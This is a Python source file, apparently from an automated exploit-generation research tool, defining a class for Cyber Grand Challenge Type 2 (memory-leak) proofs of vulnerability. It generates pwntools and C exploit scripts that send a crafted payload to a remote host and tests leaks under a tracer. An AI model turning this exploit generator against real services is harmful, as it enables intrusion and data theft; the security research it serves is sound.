import os
import tracer
import struct
import tempfile
from .cgc_exploit import CGCExploit
from .c_templates import c_template_type2

class CGCType2Exploit(CGCExploit):
    '''
    A CGC exploit object, offers more flexibility than an Exploit object for the sake of the game.
    This should represent a Type 2 POV
    https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/understanding-cfe-povs.md
    '''

    def __init__(self, crash, bypasses_nx, bypasses_aslr):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        '''
        super(CGCType2Exploit, self).__init__(crash, 2, bypasses_nx, bypasses_aslr)

        self.addr_idx = None
        self.size_idx = None
        self.output_leak_idx = None
        self._raw_payload = None

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 4:
    print "%s: <host> <port> <value>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.addr_idx) + ":" + str(self.addr_idx + 4) + """] = p32(value)

r.send(b)
"""

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload

    def dump_c(self, filename=None):
        """
        Creates a simple C file to do the type1 exploit
        :param filename: dumps the code to this path if filename is not None
        :return: the c_code
        """
        encoded_payload = ""
        for c in self._raw_payload:
            encoded_payload += "\\x%02x" % ord(c)

        fmt_args = dict()
        fmt_args["payload"] = encoded_payload
        fmt_args["addroff"] = str(self.addr_idx)
        fmt_args["sizeoff"] = str(self.size_idx)
        fmt_args["payloadsize"] = str(len(self._raw_payload))
        fmt_args["output_leak_idx"] = str(self.output_leak_idx)

        # todo using .format is annoying because of all the curly braces, figure out how to do this better
        c_code = c_template_type2.c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(c_code)
        else:
            return c_code

    def test(self):
        '''
        Test a CGC Type 2 exploit. We run the exploit against QEMU and check the contents of stdout. We should be
        able to read the data we try to leak.
        '''

        assert self._raw_payload is not None, "self._raw_payload should be initialized before calling `test`"

        address, exploit_string = self._prepare_test()

        binary_name = os.path.basename(self.crash.binary)
        stdout_file = tempfile.mktemp(dir='/tmp/', prefix="{}-stdout-".format(binary_name))

        t = tracer.Tracer(self.crash.binary, exploit_string)
        t.dynamic_trace(stdout_file)

        with open(stdout_file) as f:
            output = f.read()

        main_bin = self.crash.project.loader.main_bin
        amt = min(0x1000, main_bin.get_max_addr() - main_bin.get_min_addr())

        first_page = ''.join(self.crash.project.loader.main_bin.memory.read_bytes(address, amt))

        os.remove(stdout_file)
        return first_page in output

    def _prepare_test(self):
        '''
        Prepare a test exploit string which should leak the contents at the minimum address in process memory space.

        :return: string which exploits the target binary
        '''

        b = bytearray(self._raw_payload)

        # plus 1 to avoid null bytes, otherwise we often get 0x8048000
        address = self.crash.project.loader.min_addr() + 1
        b[self.addr_idx:self.addr_idx+4] = struct.pack("<I", address)

        main_bin = self.crash.project.loader.main_bin
        amt = min(0x1000, main_bin.get_max_addr() - main_bin.get_min_addr())
        b[self.size_idx:self.size_idx+4] = struct.pack("<I", amt)

        return address, str(b)
